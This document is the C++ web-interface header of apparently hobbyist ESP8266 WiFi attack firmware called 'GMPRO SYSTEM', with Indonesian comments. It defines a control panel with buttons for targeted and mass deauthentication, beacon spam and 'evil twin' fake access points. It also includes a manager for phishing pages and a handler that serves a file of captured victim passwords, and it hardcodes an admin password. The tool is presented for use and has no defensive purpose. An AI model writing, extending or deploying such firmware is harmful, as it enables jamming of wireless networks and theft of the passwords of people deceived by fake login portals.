#ifndef A_webserver_h
#define A_webserver_h

#include "ESP8266WebServer.h"
#include <LittleFS.h>
#include "Attack.h"
#include "settings.h"
#include "Scan.h"

extern ESP8266WebServer server;
extern Attack attack;
extern Scan scan;

// Tampilan Mizer Style: Hitam - Hijau Neon
const char WEB_STYLE[] PROGMEM = "<style>body{background:#000;color:#0f0;font-family:monospace;padding:15px;} h2{color:#f00;text-shadow: 2px 2px #333;} .tab{display:none;border:1px solid #0f0;padding:15px;margin-top:10px;} .active{display:block;} button{background:#111;color:#0f0;border:1px solid #0f0;padding:12px;margin:5px;cursor:pointer;width:170px;font-weight:bold;transition:0.3s;} button.on{background:#f00;color:#fff;box-shadow: 0 0 10px #f00;} table{width:100%;border-collapse:collapse;margin-top:15px;} th,td{border:1px solid #444;padding:8px;text-align:left;} input,select{background:#000;color:#0f0;border:1px solid #0f0;padding:5px;margin:5px;}</style>";

void handleRoot() {
  String s = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  s += FPSTR(WEB_STYLE);
  s += "</head><body><h2>GMPRO SYSTEM v8.7</h2>";
  s += "<button onclick='openT(\"t1\")'>OPERATIONS</button>";
  s += "<button onclick='openT(\"t2\")'>SETTINGS & FILES</button><hr>";

  // --- TAB 1: OPERASI SERANGAN ---
  s += "<div id='t1' class='tab active'>";
  s += "<button id='bt1' onclick='tg(\"bt1\",\"/scan\")'>SCAN WIFI</button>";
  s += "<button id='bt2' onclick='tg(\"bt2\",\"/deauth\")'>DEAUTH TARGET</button>";
  s += "<button id='bt3' onclick='tg(\"bt3\",\"/etwin\")'>EVIL TWIN</button>";
  s += "<button id='bt4' onclick='tg(\"bt4\",\"/beacon\")'>BEACON SPAM</button>";
  s += "<button id='bt5' onclick='tg(\"bt5\",\"/mass\")'>MASS DEAUTH (RUSUH)</button>";
  s += "<br><textarea id='log' style='width:100%;height:150px;background:#111;color:#0f0;border:1px solid #0f0;' readonly>GMpro Ready... SSID: GMpro2</textarea></div>";

  // --- TAB 2: SETTINGS & FILE MANAGER ---
  s += "<div id='t2' class='tab'>";
  s += "Admin SSID: <input type='text' id='ssid' value='GMpro2'><br>"; // Sesuai info SSID lu
  s += "Admin PASS: <input type='text' id='pass' value='Sangkur87'><br>";
  s += "Max Power: 20.5 dBm (Locked)<br><hr>";
  
  s += "<h3>ETWIN FILE MANAGER</h3>";
  s += "<select id='etSel'><option>etwin1.html</option><option>etwin2.html</option><option>etwin3.html</option><option>etwin4.html</option><option>etwin5.html</option></select>";
  s += "<button onclick='preview()'>PREVIEW</button><br><br>";
  s += "<button onclick='location.href=\"/pass.txt\"' style='width:100%;background:#0f0;color:#000;'>VIEW CAPTURED PASSWORDS</button></div>";

  s += "<script>";
  s += "function openT(n){var i,x=document.getElementsByClassName('tab');for(i=0;i<x.length;i++)x[i].style.display='none';document.getElementById(n).style.display='block';}";
  s += "function tg(i,u){var b=document.getElementById(i);b.classList.toggle('on');fetch(u+'?active='+b.classList.contains('on'));}";
  s += "function preview(){window.open('/preview?f='+document.getElementById('etSel').value);}";
  s += "</script></body></html>";

  server.send(200, "text/html", s);
}

void setupWebHandlers() {
  server.on("/", handleRoot);
  
  server.on("/scan", []() {
    scan.start(true);
    server.send(200, "text/plain", "Scanning...");
  });

  server.on("/mass", []() {
    bool active = server.arg("active") == "true";
    if(active) attack.start(false, true, true, false, true, 0); 
    else attack.stop();
    server.send(200, "text/plain", "Mass Deauth Toggled");
  });

  server.on("/preview", []() {
    String fileName = "/" + server.arg("f");
    if (LittleFS.exists(fileName)) {
      File f = LittleFS.open(fileName, "r");
      server.streamFile(f, "text/html");
      f.close();
    } else {
      server.send(404, "text/plain", "File Not Found. Please Upload First.");
    }
  });

  server.on("/pass.txt", []() {
    if (LittleFS.exists("/pass.txt")) {
      File f = LittleFS.open("/pass.txt", "r");
      server.streamFile(f, "text/plain");
      f.close();
    } else {
      server.send(200, "text/plain", "No passwords captured yet.");
    }
  });
}

#endif
